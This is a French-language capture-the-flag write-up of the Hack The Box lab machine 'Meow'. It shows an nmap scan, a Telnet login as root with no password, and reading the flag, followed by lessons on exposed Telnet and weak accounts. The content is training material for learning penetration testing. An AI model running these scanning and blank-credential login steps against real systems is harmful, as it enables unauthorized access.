# Meow — HTB Starting Point (Tier 0)

| | |
|---|---|
| **Section** | Starting Point — Tier 0 |
| **Machine** | `Meow` |
| **OS** | Linux |
| **IP cible** | `10.129.69.143` *(change à chaque spawn)* |
| **Difficulté** | Very Easy |
| **Date** | 2026-11-01 |
| **Résultat** | flag ✅ |

---

## TL;DR — chaîne d'attaque

```
nmap  →  port 23/tcp ouvert : Telnet (Linux telnetd)
      →  Telnet = protocole en clair, service d'admin exposé
      →  login "root" SANS mot de passe
      →  shell root direct  →  flag
```

---

## 1. Reconnaissance

```bash
box meow <IP>                      # crée le dossier + exporte $IP
nmap -sV -oN nmap/initial $IP
```

Résultat :

| Port | Service | Version |
|---|---|---|
| 23/tcp | telnet | Linux telnetd |

Un seul port, un seul chemin : **Telnet**. `Service Info: OS: Linux`.

---

## 2. Accès → flag

**Le concept :** Telnet (port 23) est un protocole d'administration à distance **en clair** (aucun chiffrement, contrairement à SSH). Ici la machine est mal configurée : le compte **`root` n'a pas de mot de passe**.

```bash
telnet $IP
# login: root        <-- aucun mot de passe demandé
```

Une fois connecté :

```bash
whoami        # root
ls
cat flag.txt
```

---

## 3. Leçons à retenir

- **Telnet ne devrait jamais être exposé** : tout passe en clair (identifiants, commandes). Remplacé partout par **SSH** (port 22, chiffré).
- **Mauvaise config = accès total** : un service d'admin + un compte sans mot de passe = compromission immédiate. Tester les comptes évidents (`root`, `admin`) est un réflexe de base.
- **Réflexe méthode** : énumérer → identifier le service → chercher l'accès le plus simple → exploiter. (Même schéma que sur Cap ensuite.)

---

## Commandes — récap express

```bash
box meow <IP>
nmap -sV -oN nmap/initial $IP
telnet $IP          # login: root (pas de mot de passe)
cat flag.txt
```
